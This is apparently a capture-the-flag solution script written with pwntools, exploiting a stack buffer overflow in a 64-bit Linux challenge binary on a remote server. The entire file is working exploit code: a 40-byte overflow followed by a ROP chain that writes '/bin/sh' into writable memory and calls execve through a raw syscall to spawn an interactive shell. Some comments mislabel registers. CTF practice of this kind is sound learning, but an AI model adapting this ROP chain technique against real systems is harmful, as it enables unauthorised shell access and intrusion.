from pwn import *

# the binary is a 64-bit little-endian ELF
context.update(arch='amd64', endian='little', os='linux')

p = remote('chall.eng.run', 31503)
# p = process('./chall')            # Spawn process

p.recvuntil(b':')
p.sendline(b'0')
p.recvuntil(b':\n')

offset      = 40                        # offset to the return address
bss         = 0x601010                  # writeable memory location
pop_rdi     = 0x40077f                  # pop rdi; ret ;
pop_rax     = 0x40079a                  # pop rax; ret ;
pop_rdx     = 0x400788                  # pop rdx; ret ;
pop_rsi     = 0x400791                  # pop rsi; ret ;
mov_rdi_rax = 0x400774                  # mov qword ptr [rdi], rax; ret ;
syscall     = 0x4007a3                  # syscall ;        
ret         = 0x40059e                  # ret ;

ropchain = b'A'*offset

# writing the /bin/sh string into writable memory address bss
ropchain += p64(pop_rax)
ropchain += b'/bin/sh\x00'				# write ‘/bin/sh’ into rsi
ropchain += p64(pop_rdi)
ropchain += p64(bss)					# write (bss) address into rdi
ropchain += p64(mov_rdi_rax)			# move rsi value into memory at rdi

# call to execve("/bin/sh", 0, 0)
# rdi, rsi, rdx are the first 3 arguments
# rdi (at this point) already points to the memory location with /bin/sh string
# rsi and rdx will now be assigned 0
# syscall code for execve is 0x3b (stored in rax)
ropchain += p64(pop_rsi)
ropchain += p64(0x0)					# write 0 into rsi
# ropchain += p64(pop_rdx)
# ropchain += p64(0x0)					# write 0 into rdx
ropchain += p64(pop_rax)
ropchain += p64(0x3b)					# write 59 into rax
ropchain += p64(syscall)
ropchain += p64(ret)

# saving the payload for direct use
# cat payload | ./ret2syscall
# (cat payload; cat) | ./ret2syscall
with open('payload', 'wb+') as fp:
    fp.write(b'0\n')
    fp.write(ropchain)

p.sendline(ropchain)

# bash has been opened and can be interacted with
p.interactive()